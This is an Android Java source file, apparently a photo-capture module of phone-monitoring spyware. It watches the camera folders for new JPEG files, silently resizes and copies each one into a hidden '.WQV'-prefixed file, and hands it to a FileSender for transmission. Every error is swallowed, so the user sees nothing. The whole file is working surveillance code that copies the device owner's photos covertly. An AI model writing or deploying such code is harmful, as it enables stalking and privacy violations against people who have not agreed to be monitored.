package com.dwreload.modules;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
//import java.util.Date;

import com.dwreload.FileSender;
import com.dwreload.SettingsManager;
import com.dwreload.FileSender.FileType;
import com.dwreload.lib.FileUtil;
import com.dwreload.lib.ImageUtil;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.graphics.Bitmap;
import android.os.Environment;
import android.os.FileObserver;
import android.preference.PreferenceManager;

public class PhotoModule implements OnSharedPreferenceChangeListener {
	private ArrayList<FileObserver> mObservers;
	private Context mContext;
	private SettingsManager settings;
	public static final String PREFIX = ".WQV";
	
	
	public PhotoModule(Context context){
		this.mContext = context;
		this.mObservers = new ArrayList<FileObserver>();
		
		if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory()) {
			return;
		}
		settings = new SettingsManager(mContext);
		String path;
		if (settings.PhotoPath().isEmpty()) path = Environment.getExternalStorageDirectory() + "/DCIM/";
		else path = settings.PhotoPath();
		File root = new File(path + "/");
		//File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
		File[] files = root.listFiles();
		if (files == null) {
			return;
		}
		for (File file : files) {
			if (file.isDirectory() && !file.isHidden()) {
				mObservers.add(new MyFileObserver(file.getAbsolutePath(), FileObserver.CLOSE_WRITE));
			}
		}
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	public void start(){
		if (new SettingsManager(mContext).isPhotoCaptureEnabled()) {
			startWatching();
		}
	}
	
	private void startWatching(){
		for (FileObserver observer : mObservers) {
			observer.startWatching();
		}
	}
	
	private void stopWatching(){
		for (FileObserver observer : mObservers) {
			observer.stopWatching();
		}
	}
	
	public void dispose(){
		try {
			PreferenceManager.getDefaultSharedPreferences(mContext).unregisterOnSharedPreferenceChangeListener(this);
			stopWatching();
		} catch (Exception e) {

		}
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("CAPTURE_PHOTO")){
			SettingsManager settings = new SettingsManager(mContext);
			if (settings.isPhotoCaptureEnabled()){
				startWatching();
			}
			else{
				stopWatching();
			}
		}
	}
	
	private class MyFileObserver extends FileObserver{
		private String lastPath;
		private String dir;
		
		public MyFileObserver(String path, int mask) {
			super(path, mask);
			
			this.lastPath = "";
			this.dir = path;
		}
		
		@Override
		public void onEvent(int event, final String path) {
			
			if (event == CLOSE_WRITE) {
				if (lastPath.equals(path) || !path.endsWith(".jpg")) {
					return;
				}
				
				lastPath = path;
				
				new Thread(new Runnable() {
					@Override
					public void run() {
						Bitmap bmp = null;
						FileOutputStream out = null;
						
						try {
							Thread.sleep(1 * 1000L);
							if (!FileUtil.isExternalStorageAvailable()) {
								return;
							}
							
							int size = new SettingsManager(mContext).capturePhotoSize();
							bmp = ImageUtil.getResizedImage(dir + "/" + path, size);
							if (bmp != null) {
								
								if (ImageUtil.isBlack(bmp)) {
									return;
								}
								
								//Date dt = new Date();
								out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, PREFIX + path));
							    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out);
							    
							    new FileSender(mContext, FileType.PHOTO).start();
							    
							}
						} catch (Exception e) {
							//ACRA.getErrorReporter().handleSilentException(e);
							
						} finally {
							if (bmp != null && !bmp.isRecycled()) {
								bmp.recycle();
								bmp = null;
							}
							
							if (out != null) {
								try {
									out.close();
								} catch (IOException e) {
									
								}
								out = null;
							}
						}
					}
				}).start();
			}
		}
		
	}
}